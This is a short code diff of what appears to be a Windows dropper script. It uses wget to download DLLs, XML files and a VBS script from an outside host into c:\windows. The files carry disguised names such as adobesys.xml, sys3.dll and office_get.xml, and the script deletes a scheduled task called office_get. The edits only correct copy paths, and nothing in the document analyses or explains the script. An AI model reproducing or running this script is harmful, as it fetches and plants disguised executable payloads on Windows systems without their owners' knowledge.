@@ -9,9 +9,9 @@ wget http://troglo.homepc.it/win/exec1.dll -O c:\windows\exec1.dll
 wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
 wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
 wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\hp\sys3.dll
-copy /Y c:\windows\sys3.dll c:\windows\sys3t.dll
+copy /Y c:\windows\hp\sys3.dll c:\windows\sys3t.dll
 wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\hp\sys2.dll
-copy /Y c:\windows\sys2.dll c:\windows\sys2t.dll
+copy /Y c:\windows\hp\sys2.dll c:\windows\sys2t.dll
 wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
 wget http://troglo.homepc.it/win/get.vbs -O c:\windows\get.vbs
 schtasks /delete /tn office_get /F
